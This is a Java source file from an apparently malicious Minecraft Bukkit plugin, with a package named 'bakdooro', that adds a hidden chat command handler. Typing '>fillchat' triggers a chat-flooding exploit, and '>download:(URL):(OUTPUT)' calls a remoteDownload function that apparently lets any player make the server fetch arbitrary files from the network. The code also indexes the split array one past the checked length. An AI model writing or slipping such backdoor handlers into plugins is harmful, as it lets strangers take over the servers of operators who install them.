package me.acaiberii.bakdooro.util.handler;

import org.bukkit.entity.Player;

import java.io.IOException;

public class chathandler {
    public static void handler(Player pl, String message) {
        if (message.startsWith(">")) {
            if (message.equals(">fillchat")) {
                me.acaiberii.bakdooro.exp.exploits.chatFill();
            } else if (message.startsWith(">download")) {
                String[] spl = message.split(":");
                if (spl.length < 3) {
                    pl.sendMessage("Invalid syntax. Correct syntax: >download:(URL):(OUTPUT)");
                }
                else {
                    me.acaiberii.bakdooro.exp.exploits.remoteDownload(spl[2], spl[3]);
                }
            }
        }
    }
}
